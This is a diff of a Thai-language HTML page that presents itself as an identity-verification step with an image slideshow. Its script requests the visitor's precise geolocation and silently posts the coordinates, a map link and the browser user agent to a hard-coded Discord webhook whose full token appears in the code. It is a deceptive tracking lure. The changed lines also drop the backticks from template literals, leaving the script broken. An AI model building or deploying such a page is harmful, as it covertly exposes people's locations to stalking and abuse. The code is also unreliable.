@@ -2,7 +2,7 @@
 <html lang="th">
 <head>
   <meta charset="UTF-8" />
-  <title>ยืนยันตัวตน</title>
+  <title>ยืนยันตัวตนด้วยตำแหน่ง + สไลด์รูป</title>
   <style>
     body {
       font-family: "Sarabun", sans-serif;
@@ -19,7 +19,7 @@
 
     h2 {
       font-size: 2rem;
-      margin-bottom: 20px;
+      margin-bottom: 30px;
     }
 
     button {
@@ -39,7 +39,7 @@
     }
 
     #status {
-      margin-top: 20px;
+      margin-top: 25px;
       font-size: 1.1rem;
       min-height: 30px;
       color: #555;
@@ -58,6 +58,7 @@
       color: #1565c0;
     }
 
+    /* สไตล์รูปภาพสไลด์ */
     #slideshow {
       margin: 30px auto;
       max-width: 400px;
@@ -67,26 +68,19 @@
       object-fit: cover;
       transition: opacity 0.5s ease-in-out;
     }
-
-    #device-info {
-      margin-top: 15px;
-      font-size: 1rem;
-      color: #444;
-    }
   </style>
 </head>
 <body>
   <h2>📍 ยืนยันตัวตน</h2>
-
+  
+  <!-- รูปภาพสำหรับสไลด์ -->
   <img id="slideshow" src="https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg" alt="Slideshow Image" />
 
   <button onclick="getLocation()">📤 กดยืนยันตัวตน</button>
-
-  <p id="device-info">📱 กำลังตรวจสอบรุ่นอุปกรณ์...</p>
   <p id="status">ยังไม่มีการยืนยัน</p>
 
   <script>
-    // ==== สไลด์รูปภาพ ====
+    // โค้ดสไลด์รูปภาพ
     const images = [
       "https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg",
       "https://m.media-amazon.com/images/S/pv-target-images/14117e646cbbd335e492cae12eb39762f02e1a4c0bf98868009444aec2e62d30.jpg",
@@ -105,25 +99,11 @@
       }, 500);
     }
 
-    setInterval(changeImage, 3000);
+    setInterval(changeImage, 3000); // เปลี่ยนรูปทุก 3 วินาที
 
-    // ==== ตรวจจับรุ่นอุปกรณ์ ====
-    function detectDeviceModel(userAgent) {
-      if (/iPhone/.test(userAgent)) {
-        return "iPhone (Apple)";
-      } else if (/Android/.test(userAgent)) {
-        const modelMatch = userAgent.match(/Android.*?;\s([^;)]*)/);
-        return modelMatch ? modelMatch[1].trim() : "Android (ไม่ทราบรุ่น)";
-      } else {
-        return "ไม่สามารถระบุรุ่นอุปกรณ์ได้";
-      }
-    }
-
-    const deviceModel = detectDeviceModel(navigator.userAgent);
-    document.getElementById("device-info").innerText = "📱 รุ่นอุปกรณ์: " + deviceModel;
-
-    // ==== ยืนยันตำแหน่ง และส่งไป Discord ====
+    // --- โค้ดยืนยันตัวตนด้วยตำแหน่ง (เดิม) ---
     const webhookUrl = "https://discord.com/api/webhooks/1380863471041777724/EONsTADIyl9QbykL2d3oq7_YyQO_BDvgucT0j2yiZkkjHypony6HReLk8MXAphuiUdCr";
+
     const statusEl = document.getElementById("status");
 
     function setStatus(text, type = "") {
@@ -133,7 +113,7 @@
     }
 
     function getLocation() {
-      setStatus("⏳ กําลังระบุตำแหน่ง...", "loading");
+      setStatus("⏳ กําลังไป..", "loading");
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
           enableHighAccuracy: true,
@@ -148,15 +128,17 @@
     function sendToDiscord(position) {
       const lat = position.coords.latitude.toFixed(6);
       const lon = position.coords.longitude.toFixed(6);
-      const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+      const mapUrl = https://www.google.com/maps?q=${lat},${lon};
       const userAgent = navigator.userAgent;
 
-      const content = `📍 มีผู้ใช้ส่งตำแหน่ง:\n\n🌐 [ดูบนแผนที่](${mapUrl})\n📌 พิกัด: ${lat}, ${lon}\n📱 รุ่นอุปกรณ์: ${deviceModel}\n💻 UA: ${userAgent}`;
+      const data = {
+        content: 📍 มีผู้ใช้ส่งตำแหน่ง:\n\n🌐 [ดูบนแผนที่](${mapUrl})\n📌 พิกัด: ${lat}, ${lon}\n💻 อุปกรณ์: ${userAgent}
+      };
 
       fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content })
+        body: JSON.stringify(data)
       })
       .then(response => {
         if (response.ok) {
@@ -174,10 +156,10 @@
       let msg = "";
       switch(error.code) {
         case error.PERMISSION_DENIED:
-          msg = "ผู้ใช้ปฏิเสธการแชร์ตำแหน่ง";
+          msg = "ผู้ใช้ปฏิเสธ";
           break;
         case error.POSITION_UNAVAILABLE:
-          msg = "ไม่สามารถระบุตำแหน่งได้";
+          msg = "ไม่สามารถระบุได้";
           break;
         case error.TIMEOUT:
           msg = "หมดเวลาในการระบุ";
